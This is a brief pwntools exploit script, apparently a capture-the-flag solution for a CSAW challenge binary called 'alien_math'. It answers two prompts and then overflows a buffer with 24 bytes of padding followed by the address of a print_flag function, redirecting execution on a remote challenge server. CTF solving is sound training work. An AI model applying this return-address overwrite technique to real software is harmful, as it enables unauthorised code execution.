from pwn import *

e = ELF('./alien_math')

p = remote("pwn.chal.csaw.io", 5004)
p.sendlineafter("zopnol", "1804289383")
p.sendlineafter("qorbnorbf?", "7856445899213065428791")
p.sendlineafter("One question", b"A" * 0x18 + p64(e.symbols["print_flag"]))

p.interactive()

